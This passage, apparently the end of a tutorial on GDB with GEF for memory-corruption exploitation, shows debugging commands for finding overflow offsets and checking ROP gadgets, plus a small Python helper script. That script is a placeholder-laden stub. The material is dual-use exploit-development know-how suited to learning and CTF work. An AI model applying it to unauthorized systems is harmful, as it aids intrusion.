gef➤ pattern search $rsp            # Check stack pointer
gef➤ pattern search *($rbp+8)       # Check saved return address

# Issue: ROP gadget not working  
# Solution: Verify gadget addresses and alignment
gef➤ x/5i 0x401273                  # Examine gadget instructions
gef➤ disassemble 0x401270,0x401280  # Context around gadget

# Issue: Segfault on exploitation
# Solution: Check address validity and permissions
gef➤ vmmap                          # Check memory permissions
gef➤ telescope $rsp 20              # Examine stack corruption
```

### Advanced Automation

```python
# GEF Python automation script
# Save as exploit_automation.py

import gdb
import struct

class ExploitHelper(gdb.Command):
    def __init__(self):
        super(ExploitHelper, self).__init__("exploit-helper", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        # Find buffer overflow offset automatically
        gdb.execute("pattern create 1000")
        gdb.execute("run PATTERN_HERE")
        
        # Get crashed RIP/EIP value
        if gdb.selected_inferior().pid != 0:
            try:
                rip = gdb.parse_and_eval("$rip")
                gdb.execute(f"pattern search {rip}")
            except:
                eip = gdb.parse_and_eval("$eip") 
                gdb.execute(f"pattern search {eip}")

ExploitHelper()

# Usage: exploit-helper
```

This comprehensive set of practical examples demonstrates the power of GDB with GEF for both 32-bit and 64-bit exploitation scenarios. The examples show real exploitation techniques with complete workflows, from initial analysis through successful exploitation, highlighting the key differences between architectures and providing practical commands for each step of the process.